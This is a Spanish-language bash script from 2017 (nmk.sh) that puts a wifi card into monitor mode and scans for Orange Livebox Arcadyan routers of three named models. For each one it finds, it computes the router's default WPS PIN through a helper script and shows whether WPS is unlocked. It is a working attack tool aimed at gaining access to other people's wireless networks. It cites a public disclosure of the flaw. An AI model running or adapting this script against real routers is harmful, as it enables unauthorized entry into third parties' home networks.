#! /bin/bash
version=1.3
# nmk.sh is a bash script that scans the wifi networks in search of livebox by arcadyan from orange (Spain) and it genrates the default WPS PIN for the vulnerables devices detected.
# Copyright (C) 2017 kcdtv @ www.wifi-libre.com
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
# Contact author: kcdtv@wifi-libre.com

# Full disclosure about the arcadyan the breach in https://www.wifi-libre.com/topic-869-todo-sobre-al-algoritmo-wps-livebox-arcadyan-orange-xxxx.html

# Global variables:
grey="\033[0;37m"
orange="\033[38;5;202m"
red="\033[1;31m"
yellow="\033[1;33m"
white="\033[1;37m"
green="\033[0;32m"

# Function
echo -e "Copyleft (C) 2017 kcdtv @ www.wifi-libre.com

	$orange		 ▐ ▄ • ▌ ▄ ·. ▄ •▄   $white .▄▄ ·  ▄ .▄
	$orange		•█▌▐█·██ ▐███▪█▌▄▌▪  $white ▐█ ▀. ██▪▐█
	$orange		▐█▐▐▌▐█ ▌▐▌▐█·▐▀▀▄·  $white ▄▀▀▀█▄██▀▐█
	$orange		██▐█▌██ ██▌▐█▌▐█.█▌  $white ▐█▄▪▐███▌▐▀
	$orange		▀▀ █▪▀▀  █▪▀▀▀·▀  ▀ ▀$white  ▀▀▀▀ ▀▀▀ ·
 $white _        $orange  _ _        
 $white[|\|aranja$orange //\/\ekanika$grey 
$white version$orange $version$grey -$white coded by$orange kcdtv$white for$orange www.wifi-libre.com
	        $white Detecta las redes$orange Orange-XXXX$white y genera su$orange PIN WPS$white   
      $white Para$orange Livebox$white Arcadyan$orange ARV7519RW22$white,$orange ARV7520CW22$white y$orange VRV9510KWAC23$grey

"

# Check privileges, dependencies, monitor mode compatibility, reaver and wash.
echo -e "$orange▐█$white   Comprobando privilegios$grey"
whoami | grep root || { echo -e "$red▐█   Error$grey - Se debe ejecutar el script con$yellow sudo$grey o$yellow su$grey para tener privilegios de administrador.  
$red▐█   Exit.$grey"; exit 1; }
echo -e "$orange▐█$white   Comprobando instalación reaver$grey"
which reaver || { echo -e "$red▐█   Error$grey -$yellow Reaver$grey no está instalado.  Instala la última revisión de $yellow Reaver v1.6.1$grey (o versión superior) desde:$white https://github.com/t6x/reaver-wps-fork-t6x$grey 
$red▐█   Exit.$grey"; exit 1; } 
reaver  &>> /tmp/versionreaver
grep "Reaver v1.6." /tmp/versionreaver || { echo -e "$red▐█   Error$grey - Se debe actualizar reaver. Instala la última revisión de $yellow Reaver v1.6.1$grey (o duperior) desde:$white https://github.com/t6x/reaver-wps-fork-t6x$grey  
$red▐█   Exit.$grey"; exit 1; }
rm /tmp/versionreaver
echo -e "$orange▐█$white   Comprobando instalación wash$grey"
which wash || { echo -e "$red▐█   Error$grey -$yellow Wash$grey no está instalado. Instala la última revisión de $yellow Reaver v1.6.1$grey (o superior) desde:$white https://github.com/t6x/reaver-wps-fork-t6x$grey 
$red▐█   Exit.$grey"; exit 1; }
wash  &>> /tmp/versionwash
grep "extended WPS info" /tmp/versionwash || { echo -e "$red▐█   Error$grey - Se debe actualizar wash. Instala la última revisión de $yellow Reaver v1.6.1$grey (o duperior) desde:$white https://github.com/t6x/reaver-wps-fork-t6x$grey 
$red▐█   Exit.$grey"; exit 1; }
echo -e "$orange▐█$white   Comprobando orangen.py$grey"
[ -f orangen.py ] || { echo -e "$red▐█   Error$grey - Debeís ejecutar el script con la terminal situada en el driectorio $yellow nmk$grey. No borreís o moveís el script$yellow orangen.py$grey situado en dicho driectorio.  
$red▐█   Exit.$grey"; exit 1; }

# WiFi Interface selection and mode monitor activation
rm /tmp/versionwash /tmp/interfaces /tmp/scan /tmp/iwdev 2>/dev/null
airmon-ng | grep phy &>> /tmp/interfaces
  if [ ! -s /tmp/interfaces ];
    then
      echo -e "$red▐█   Error$grey -  Airmon-ng no detecta ninguna interfaz compatible modo monitor
$red▐█   Exit.$grey"
  fi
  if [ "$(grep -c phy /tmp/interfaces)" == 1 ];
    then 
      wlan=$(awk '{ print $2 }' /tmp/interfaces )
      echo -e "$orange▐█$white   Una sola interfaz WiFi detectada y seleccionada: $orange$wlan$grey"
  else
      echo -e "$orange▐█$white   Varias interfaces disponibles. Elija una.$grey"
        while [ -z "$wlan" ]; 
          do
            echo -e "
        Num      Interfaz 	Driver		Chipset"
        nl < /tmp/interfaces
        echo ""
        echo -e "$orange▐█$white   Interfaz:$orange"
        read -r -n 1 -ep "     " number
        wlan=$(awk '{ print $2 }' /tmp/interfaces | sed "$number!d" 2>/dev/null )   
           if [ -z "$wlan" ]; 
             then
                echo -e "$red▐█   Error$grey -$white Numero interfaz incorrecto ($orange$number$white).$grey"
           else
                echo -e "$orange▐█$white   Interfaz $orange$wlan$white seleccionada$grey"
           fi 
        done
  fi  
iw dev &>> /tmp/iwdev
  if [ -n "$( grep -A 4  '\'"$wlan"'\b' /tmp/iwdev | grep monitor)" ];
    then
      iface="$wlan"
  else
      echo -e "$orange▐█$white   Activando el modo monitor$grey" 
      driver=$(grep '\'"$wlan"'\b' /tmp/interfaces | awk '{ print $3 }')
      if [[ "$driver" == "8812au" || "$driver" == "8814au" ]]; 
        then
          airmon-ng check kill
          rfkill unblock wifi
          ip link set $wlan down
          iwconfig $wlan mode monitor
          ip link set $wlan up
          iface="$wlan"
        else
          airmon-ng start $wlan
          phy=$(grep $wlan /tmp/interfaces | awk '{ print $1 }' | cut -c 4)
          iface=$(iw dev | grep -A 1 "phy#$phy" | tail -n 1 | awk '{ print $2 }')
      fi   
  fi
phy=$(airmon-ng | grep '\'"$iface"'\b' | awk '{ print $1 }')
# aband=$(iw phy $phy info | grep -o "5200 MHz")    #  To eventualy introduce 5Ghz scanning

# Launching the scan with live default PIN generation
wash -i $iface -j >> /tmp/scan &
washPID=$!
trap 'break' SIGINT
  for (( i=0; ;i+=4 ))
    do
      clear
      echo -e "$orange▐█$white   Tiempo de escaneo: $orange$i$white segundos
$orange▐█$white   $orange$(wc -l < /tmp/scan)$white redes comprobadas, $orange$( grep -c -E "ARV7519RW22|ARV7520CW22|VRV9510KWAC23" /tmp/scan )$white son vulnerables.$grey
$orange▐█$white   Pulsar <$orange CTRL$white +$orange C$white > para parar el escaneo$grey

      bSSID           eSSID   Canal RSSI   PIN ¿Abierto? Serial      Modelo
--------------------------------------------------------------------------------"
        while read line
          do
              if [ -n "$(echo $line | grep ARV7519RW22)" ] || [ -n "$(echo $line | grep ARV7520CW22)" ] || [ -n "$(echo $line | grep VRV9510KWAC23)" ];
                then
                bssid=$(echo $line | awk -F '"' '{ print $4}')
                essid=$(echo $line | awk -F '"' '{ print $8}')
                ssid=$(echo "$essid           " | cut -c -11 )  
                channel=$(echo 0$( echo $line | awk -F '"' '{ print $11}' | awk '{ print $2}' | tr -d ',' )| rev | cut -c 1-2 | rev)
                rssi=$(echo $line | awk -F '"' '{ print $13}' | cut -c4-6)
                lck=$(echo $line | awk -F '"' '{ print $19}' | cut -c 4)
                  if [[ $lck == 2 ]];
                    then
                      abierto=$(echo -e "$green sí")
                    else
                      abierto=$(echo -e "$red no") 
                  fi 
                model=$(echo $line | awk -F '"' '{ print $26}')
                serial=$(echo $line | awk -F '"' '{ print $38}') 
                uuid=$(echo $line | awk -F '"' '{ print $42}' | cut -c 29-)
                  if [[ $uuid == 0000 ]] ;
                    then
                      wan="ffff"
                  else
                      wan=$(printf "%04x" $(( 0x$uuid - 1 )))
                  fi     
                seri=$(echo $serial | cut -c 7-)
                pin=$(python orangen.py $wan $seri)
                echo -e "$orange$bssid  $white$ssid  $orange$channel  $white$rssi  $yellow$pin $abierto  $orange$serial  $white$model$grey"
           fi
        done < /tmp/scan
      sleep 3
  done
trap - SIGINT
kill $washPID 2>/dev/null
echo -e "
$orange▐█   $white La interfaz$orange $iface$white sigue en modo monitor.$grey

Copyleft (C) 2017 kcdtv @ www.wifi-libre.com$grey"
rm -r /tmp/interfaces /tmp/scan /tmp/iwdev
exit 0
